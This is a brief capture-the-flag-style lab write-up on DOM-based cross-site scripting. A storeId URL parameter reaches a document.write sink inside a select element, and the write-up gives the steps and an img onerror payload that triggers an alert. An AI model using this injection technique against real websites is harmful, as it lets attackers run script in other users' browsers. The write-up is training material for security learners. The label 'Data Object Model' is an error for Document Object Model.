## LAB 3 WRITEUP

 * vulnerability type   :- DATA OBJECT MODEL XSS  (DOM)
 * LAB TOPIC            :- DOM XSS in document.write sink using source location.search inside a select element
  
  1. Access  the lab and view stock option in post 
  2. open developer mode and see on source tab under which LAB.JS were there 
  3. search to **location.search** 
  4. var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
  5. 
  6. edit the url and add storeId=<img src=1 onerror=alert(1)>
  7. and press enter

 * IMPACT  :- The payload sent thorugh url parameter . the application check img src . img src failed . error generate and alert function() trigger  in stock function . 
   
  ![DOM xss ](image.png)